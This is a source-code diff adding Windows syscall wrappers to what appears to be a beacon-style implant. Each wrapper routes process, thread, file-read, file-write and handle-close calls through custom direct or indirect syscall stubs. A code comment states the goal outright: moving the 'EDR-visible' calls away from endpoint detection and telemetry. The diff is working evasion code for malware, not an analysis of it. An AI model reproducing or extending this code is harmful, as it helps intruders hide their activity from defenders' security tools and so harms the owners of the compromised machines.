@@ -512,3 +512,173 @@ HANDLE beacon_CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES sa, SIZE
 	return CreateRemoteThread(hProcess, sa, stack, start, param, flags, outId);
 #endif
 }
+
+/* ============ file/token family wrappers (round 22) ============ */
+
+typedef struct { ULONG Length; HANDLE RootDirectory; void * ObjectName; ULONG Attributes; void * SecurityDescriptor; void * SecurityQualityOfService; } G3_OA;
+
+#if defined(_M_X64)
+typedef NTSTATUS(NTAPI *fn_NtOpenProcess)(PHANDLE, ACCESS_MASK, void *, void *);
+typedef NTSTATUS(NTAPI *fn_NtOpenThread)(PHANDLE, ACCESS_MASK, void *, void *);
+typedef NTSTATUS(NTAPI *fn_NtClose)(HANDLE);
+typedef NTSTATUS(NTAPI *fn_NtReadFile)(HANDLE, HANDLE, void *, void *, void *, void *, ULONG, void *, void *);
+typedef NTSTATUS(NTAPI *fn_NtWriteFile)(HANDLE, HANDLE, void *, void *, void *, void *, ULONG, void *, void *);
+
+static NTSTATUS sc_call_openproc(PHANDLE out, ACCESS_MASK acc, void * oa, void * cid) {
+	int m = syscall_method_get();
+	fn_NtOpenProcess fn;
+	if (m == 0 || !sc_openproc.ready)
+		return ((fn_NtOpenProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenProcess"))(out, acc, oa, cid);
+	fn = (fn_NtOpenProcess)make_exec(&sc_openproc, m == 2);
+	if (fn == NULL)
+		return ((fn_NtOpenProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenProcess"))(out, acc, oa, cid);
+	return fn(out, acc, oa, cid);
+}
+
+static NTSTATUS sc_call_openthrd(PHANDLE out, ACCESS_MASK acc, void * oa, void * cid) {
+	int m = syscall_method_get();
+	fn_NtOpenThread fn;
+	if (m == 0 || !sc_openthrd.ready)
+		return ((fn_NtOpenThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenThread"))(out, acc, oa, cid);
+	fn = (fn_NtOpenThread)make_exec(&sc_openthrd, m == 2);
+	if (fn == NULL)
+		return ((fn_NtOpenThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenThread"))(out, acc, oa, cid);
+	return fn(out, acc, oa, cid);
+}
+
+static NTSTATUS sc_call_close(HANDLE h) {
+	int m = syscall_method_get();
+	fn_NtClose fn;
+	if (m == 0 || !sc_close.ready)
+		return ((fn_NtClose)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose"))(h);
+	fn = (fn_NtClose)make_exec(&sc_close, m == 2);
+	if (fn == NULL)
+		return ((fn_NtClose)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose"))(h);
+	return fn(h);
+}
+
+static NTSTATUS sc_call_readfile(HANDLE fh, HANDLE ev, void * apc, void * apcr, void * iosb, void * buf, ULONG len, void * boff, void * key) {
+	int m = syscall_method_get();
+	fn_NtReadFile fn;
+	if (m == 0 || !sc_rfile.ready)
+		return ((fn_NtReadFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadFile"))(fh, ev, apc, apcr, iosb, buf, len, boff, key);
+	fn = (fn_NtReadFile)make_exec(&sc_rfile, m == 2);
+	if (fn == NULL)
+		return ((fn_NtReadFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadFile"))(fh, ev, apc, apcr, iosb, buf, len, boff, key);
+	return fn(fh, ev, apc, apcr, iosb, buf, len, boff, key);
+}
+
+static NTSTATUS sc_call_writefile(HANDLE fh, HANDLE ev, void * apc, void * apcr, void * iosb, void * buf, ULONG len, void * boff, void * key) {
+	int m = syscall_method_get();
+	fn_NtWriteFile fn;
+	if (m == 0 || !sc_wfile.ready)
+		return ((fn_NtWriteFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteFile"))(fh, ev, apc, apcr, iosb, buf, len, boff, key);
+	fn = (fn_NtWriteFile)make_exec(&sc_wfile, m == 2);
+	if (fn == NULL)
+		return ((fn_NtWriteFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteFile"))(fh, ev, apc, apcr, iosb, buf, len, boff, key);
+	return fn(fh, ev, apc, apcr, iosb, buf, len, boff, key);
+}
+#endif
+
+HANDLE beacon_OpenProcess(DWORD access, BOOL inherit, DWORD pid) {
+#if defined(_M_X64)
+	G3_OA oa;
+	struct { HANDLE pid; HANDLE tid; } cid;
+	HANDLE h = NULL;
+	NTSTATUS st;
+
+	if (syscall_method_get() == 0)
+		return OpenProcess(access, inherit, pid);
+	memset(&oa, 0, sizeof(oa));
+	oa.Length = sizeof(oa);
+	memset(&cid, 0, sizeof(cid));
+	cid.pid = (HANDLE)(ULONG_PTR)pid;
+	st = sc_call_openproc(&h, access, &oa, &cid);
+	return NT_SUCCESS(st) ? h : NULL;
+#else
+	return OpenProcess(access, inherit, pid);
+#endif
+}
+
+HANDLE beacon_OpenThread(DWORD access, BOOL inherit, DWORD tid) {
+#if defined(_M_X64)
+	G3_OA oa;
+	struct { HANDLE pid; HANDLE tid; } cid;
+	HANDLE h = NULL;
+	NTSTATUS st;
+
+	if (syscall_method_get() == 0)
+		return OpenThread(access, inherit, tid);
+	memset(&oa, 0, sizeof(oa));
+	oa.Length = sizeof(oa);
+	memset(&cid, 0, sizeof(cid));
+	cid.tid = (HANDLE)(ULONG_PTR)tid;
+	st = sc_call_openthrd(&h, access, &oa, &cid);
+	return NT_SUCCESS(st) ? h : NULL;
+#else
+	return OpenThread(access, inherit, tid);
+#endif
+}
+
+BOOL beacon_CloseHandle(HANDLE h) {
+#if defined(_M_X64)
+	if (syscall_method_get() == 0)
+		return CloseHandle(h);
+	return NT_SUCCESS(sc_call_close(h));
+#else
+	return CloseHandle(h);
+#endif
+}
+
+BOOL beacon_ReadFile(HANDLE h, LPVOID buf, DWORD toRead, LPDWORD got, LPOVERLAPPED ov) {
+#if defined(_M_X64)
+	/* IO_STATUS_BLOCK aligned like the ntdll contract */
+	__declspec(align(8)) struct { LONG_PTR st; ULONG_PTR info; } iosb;
+	NTSTATUS st;
+
+	if (syscall_method_get() == 0)
+		return ReadFile(h, buf, toRead, got, ov);
+	st = sc_call_readfile(h, NULL, NULL, NULL, &iosb, buf, toRead,
+	                      ov ? (void *)&ov->Offset : NULL, NULL);
+	if (got)
+		*got = (DWORD)iosb.info;
+	if (st == 0x00000103) /* STATUS_PENDING with sync handle: the read is
+	                       * queued; the caller waits on the handle */
+		return FALSE;
+	return NT_SUCCESS(st);
+#else
+	return ReadFile(h, buf, toRead, got, ov);
+#endif
+}
+
+BOOL beacon_WriteFile(HANDLE h, LPCVOID buf, DWORD toWrite, LPDWORD wrote, LPOVERLAPPED ov) {
+#if defined(_M_X64)
+	__declspec(align(8)) struct { LONG_PTR st; ULONG_PTR info; } iosb;
+	NTSTATUS st;
+
+	if (syscall_method_get() == 0)
+		return WriteFile(h, buf, toWrite, wrote, ov);
+	st = sc_call_writefile(h, NULL, NULL, NULL, &iosb, (void *)buf, toWrite,
+	                        ov ? (void *)&ov->Offset : NULL, NULL);
+	if (wrote)
+		*wrote = (DWORD)iosb.info;
+	if (st == 0x00000103)
+		return FALSE;
+	return NT_SUCCESS(st);
+#else
+	return WriteFile(h, buf, toWrite, wrote, ov);
+#endif
+}
+
+HANDLE beacon_CreateFileA(LPCSTR name, DWORD access, DWORD share, LPSECURITY_ATTRIBUTES sa, DWORD disp, DWORD flags, HANDLE tmpl) {
+#if defined(_M_X64)
+	/* NtCreateFile needs OBJECT_ATTRIBUTES + UNICODE_STRING; the Win32
+	 * translation is non-trivial (RtlDosPathNameToNtPathName). Route
+	 * through the plain API for now - CreateFileA is rarely a hot
+	 * detection target (the read/write/close syscalls above carry the
+	 * EDR-visible weight). Revisit if file-creation telemetry matters. */
+	return CreateFileA(name, access, share, sa, disp, flags, tmpl);
+#else
+	return CreateFileA(name, access, share, sa, disp, flags, tmpl);
+#endif
+}
